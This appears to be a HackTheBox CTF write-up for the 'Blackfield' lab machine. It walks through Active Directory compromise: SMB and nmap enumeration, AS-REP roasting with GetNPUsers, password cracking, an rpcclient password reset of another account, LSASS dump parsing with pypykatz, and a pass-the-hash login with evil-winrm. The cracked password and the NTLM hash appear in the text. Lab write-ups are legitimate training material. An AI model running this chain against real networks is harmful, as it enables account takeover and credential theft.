---
title: HackTheBox Blackfield Writeup
published: true
---

![](https://i.ibb.co/bPJypM8/logo.png)

# []()Methodology

* smb anonymous login
* enum **profile$** share
* Generating **TGT** for a valid user
* rpcclient login
* enum privileges && change **audit2020** password
* got a lsass.zip file
* unzipping the file and Dumping NTLM hashs by **pypykatz**
* login as svc_backup --> **user flag**
* enum privileges --> **svc_backup** can backup files
* using diskshadow to create a new volume with alias of c:
* got the **ntds.dit**
* Saving the registry file **SYSTEM**
* Cracking the NTLM using **secretsdump.py**
* Login as administartor --> **root flag**

# []()Nmap scan

> **as always, i’ll do nmap scan to find out which services running in this machine.**

* 88 --> kerberos-sec
* 135 --> msrpc
* 389 --> ldap

> **nmap -sC -sV -Pn -oN scan.txt 10.10.10.192**

```ruby

Nmap scan report for 10.10.10.192
Host is up (0.18s latency).
Not shown: 993 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-12 07:25:27Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/12%Time=5F0AABB4%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1h04m54s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-07-12T07:27:52
|_  start_date: N/A


```

* this is AD machine as we know, Domain name: **BLACKFIELD**, let's enumerate smb shares now.

# []() Smb Enumeration

> **smbclient -N -L \\\\10.10.10.192**

```ruby

╭─xdev05@nic3One ~/Documents/HTB/BlackFild  
╰─➤  smbclient -N -L \\\\10.10.10.192 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	profiles$       Disk      
	SYSVOL          Disk      Logon server share 


```

* we can't access the forensic share.

![](https://i.ibb.co/cCgLTsd/forensic.png)

* let's enum profiles share now.

![](https://i.ibb.co/2SH9MrJ/profiles.png)

* we need to make a wordlist of users now and here it is.

```ruby

Alleni
ABarteski
ABekesz
ABenzies
ABiemiller
AChampken
ACheretei
ACsonaki
AHigchens
AJaquemai
AKlado
AKoffenburger
AKollolli
AKruppe
AKubale
ALamerz
AMaceldon
AMasalunga
ANavay
ANesterova
ANeusse
AOkleshen
APustulka
ARotella
ASanwardeker
AShadaia
ASischo
ASpruce
ATakach
ATaueg
ATwardowski
audit2020
AWangenheim
AWorsey
AZigmunt
BBakajza
BBeloucif
BCarmitcheal
BConsultant
BErdossy
BGeminski
BLostal
BMannise
BNovrotsky
BRigiero
BSamkoses
BZandonella
CAcherman
CAkbari
CAldhowaihi
CArgyropolous
CDufrasne
CGronk
Chiucarello
Chiuccariello
CHoytal
CKijauskas
CKolbo
CMakutenas
CMorcillo
CSchandall
CSelters
CTolmie
DCecere
DChintalapalli
DCwilich
DGarbatiuc
DKemesies
DMatuka
DMedeme
DMeherek
DMetych
DPaskalev
DPriporov
DRusanovskaya
DVellela
DVogleson
DZwinak
EBoley
EEulau
EFeatherling
EFrixione
EJenorik
EKmilanovic
ElKatkowsky
EmaCaratenuto
EPalislamovic
EPryar
ESachhitello
ESariotti
ETurgano
EWojtila
FAlirezai
FBaldwind
FBroj
FDeblaquire
FDegeorgio
FianLaginja
FLasokowski
FPflum
FReffey
GaBelithe
Gareld
GBatowski
GForshalger
GGomane
GHisek
GMaroufkhani
GMerewether
GQuinniey
GRoswurm
GWiegard
HBlaziewske
HColantino
HConforto
HCunnally
HGougen
HKostova
IChristijr
IKoledo
IKotecky
ISantosi
JAngvall
JBehmoiras
JDanten
JDjouka
JKondziola
JLeytushsenior
JLuthner
JMoorehendrickson
JPistachio
JScima
JSebaali
JShoenherr
JShuselvt
KAmavisca
KAtolikian
KBrokinn
KCockeril
KColtart
KCyster
KDorney
KKoesno
KLangfur
KMahalik
KMasloch
KMibach
KParvankova
KPregnolato
KRasmor
KShievitz
KSojdelius
KTambourgi
KVlahopoulos
KZyballa
LBajewsky
LBaligand
LBarhamand
LBirer
LBobelis
LChippel
LChoffin
LCominelli
LDruge
LEzepek
LHyungkim
LKarabag
LKirousis
LKnade
LKrioua
LLefebvre
LLoeradeavilez
LMichoud
LTindall
LYturbe
MArcynski
MAthilakshmi
MAttravanam
MBrambini
MHatziantoniou
MHoerauf
MKermarrec
MKillberg
MLapesh
MMakhsous
MMerezio
MNaciri
MShanmugarajah
MSichkar
MTemko
MTipirneni
MTonuri
MVanarsdel
NBellibas
NDikoka
NGenevro
NGoddanti
NMrdirk
NPulido
NRonges
NSchepkie
NVanpraet
OBelghazi
OBushey
OHardybala
OLunas
ORbabka
PBourrat
PBozzelle
PBranti
PCapperella
PCurtz
PDoreste
PGegnas
PMasulla
PMendlinger
PParakat
PProvencer
PTesik
PVinkovich
PVirding
PWeinkaus
RBaliukonis
RBochare
RKrnjaic
RNemnich
RPoretsky
RStuehringer
RSzewczuga
RVallandas
RWeatherl
RWissor
SAbdulagatov
SAjowi
SAlguwaihes
SBonaparte
SBouzane
SChatin
SDellabitta
SDhodapkar
SEulert
SFadrigalan
SGolds
SGrifasi
SGtlinas
SHauht
SHederian
SHelregel
SKrulig
SLewrie
SMaskil
Smocker
SMoyta
SRaustiala
SReppond
SSicliano
SSilex
SSolsbak
STousignaut
support
svc_backup
SWhyte
SWynigear
TAwaysheh
TBadenbach
TCaffo
TCassalom
TEiselt
TFerencdo
TGaleazza
TKauten
TKnupke
TLintlop
TMusselli
TOust
TSlupka
TStausland
TZumpella
UCrofskey
UMarylebone
UPyrke
VBublavy
VButziger
VFuscca
VLitschauer
VMamchuk
VMarija
VOlaosun
VPapalouca
WSaldat
WVerzhbytska
WZelazny
XBemelen
XDadant
XDebes
XKonegni
XRykiel
YBleasdale
YHuftalin
YKivlen
YKozlicki
YNyirenda
YPredestin
YSeturino
YSkoropada
YVonebers
YZarpentine
ZAlatti
ZKrenselewski
ZMalaab
ZMiick
ZScozzari
ZTimofeeff
ZWausik

```

* now it's time to get TGT for any valid user.

# []()Using GetNPuser.py to get TGT

> **since now we have a list of users,so we can use GetNPuser from impacket to generate a TGT for any valid user.**

> **python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py BLACKFIELD.LOCAL/ -usersfile users.txt -format john -outputfile TGT -dc-ip 10.10.10.192**

![](https://i.ibb.co/9qLqHFV/tgt.png)

* we got a TGT for user **support**, let's crack it with john now.

> **sudo john --wordlist=/usr/share/wordlists/rockyou.txt TGT**

![](https://i.ibb.co/YR3zjqy/support-pass.png)

> Username: **SUPPORT**, Password: **#00^BlackKnight**

# []() login to RPCCLIENT

> **rpcclient 10.10.10.192 -U support**

![](https://i.ibb.co/r4D7K30/rpcclient.png)

* let's enum domain users.

![](https://i.ibb.co/VSSzd19/enumuserrs.png)

* let's check our privilegs.

```ruby

rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege 		0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege 		0:3 (0x0:0x3)
SeLockMemoryPrivilege 		0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege 		0:5 (0x0:0x5)
SeMachineAccountPrivilege 		0:6 (0x0:0x6)
SeTcbPrivilege 		0:7 (0x0:0x7)
SeSecurityPrivilege 		0:8 (0x0:0x8)
SeTakeOwnershipPrivilege 		0:9 (0x0:0x9)
SeLoadDriverPrivilege 		0:10 (0x0:0xa)
SeSystemProfilePrivilege 		0:11 (0x0:0xb)
SeSystemtimePrivilege 		0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege 		0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege 		0:14 (0x0:0xe)
SeCreatePagefilePrivilege 		0:15 (0x0:0xf)
SeCreatePermanentPrivilege 		0:16 (0x0:0x10)
SeBackupPrivilege 		0:17 (0x0:0x11)
SeRestorePrivilege 		0:18 (0x0:0x12)
SeShutdownPrivilege 		0:19 (0x0:0x13)
SeDebugPrivilege 		0:20 (0x0:0x14)
SeAuditPrivilege 		0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege 		0:22 (0x0:0x16)
SeChangeNotifyPrivilege 		0:23 (0x0:0x17)
SeRemoteShutdownPrivilege 		0:24 (0x0:0x18)
SeUndockPrivilege 		0:25 (0x0:0x19)
SeSyncAgentPrivilege 		0:26 (0x0:0x1a)
SeEnableDelegationPrivilege 		0:27 (0x0:0x1b)
SeManageVolumePrivilege 		0:28 (0x0:0x1c)
SeImpersonatePrivilege 		0:29 (0x0:0x1d)
SeCreateGlobalPrivilege 		0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege 		0:31 (0x0:0x1f)
SeRelabelPrivilege 		0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege 		0:33 (0x0:0x21)
SeTimeZonePrivilege 		0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege 		0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege 		0:36 (0x0:0x24)
rpcclient $> 

```

> we can change the password of other users.

```ruby

rpcclient $> setuserinfo2
Usage: setuserinfo2 username level password [password_expired]
result was NT_STATUS_INVALID_PARAMETER
rpcclient $>

```

* read this blog [reset-ad-user-password-with-linux](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)

> **setuserinfo2 audit2020 23 'xdevo512@@'**

```ruby

╭─xdev05@nic3One ~/Documents/HTB/BlackFild  
╰─➤  smbclient \\\\10.10.10.192\\forensic -U audit2020                                                                                                         1 ↵
Enter WORKGROUP\audit2020's password: 
Try "help" to get a list of possible commands.
smb: \> 

```

* now let's download the lsass.ZIP file.

![](https://i.ibb.co/7yyFSpy/lsasszip.png)

> this is unintended solution, you got TIMOUT error when download the lsass.zip, so you need to mount this share.

* we can use cifs.utility to mount this share.

> **sudo mount -t cifs //10.10.10.192/forensic /mnt/forensic -o user=audit2020**

![](https://i.ibb.co/0KDBhjQ/forensics.png)

* and here is the lsass.ZIP file.

![](https://i.ibb.co/fqV5ywg/lsasszipfile.png)


> after unzipping the file i got lsass.DMP file, we will extract NTLM hash from it by pypykatz, or you can use mimikatz.

* read this blogs, [pypykatz](https://www.stevencampbell.info/Parsing-Creds-From-Lsass.exe-Dumps-Using-Pypykatz/), [mimikatz](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)

> **pypykatz lsa minidump lsass.DMP -o lsass.txt**

![](https://i.ibb.co/s29ksq7/svc-backup.png)

* nice!, now we have the **NTLM** hash for the **svc_backup** user, let's login with it now.

> **evil-winrm -i 10.10.10.192 -u svc_backup -H "9658d1d1dcd9250115e2205d9f48400d"**

![](https://i.ibb.co/93B0zJ5/svc-flag.png)

* nice!, let's got to the root now.


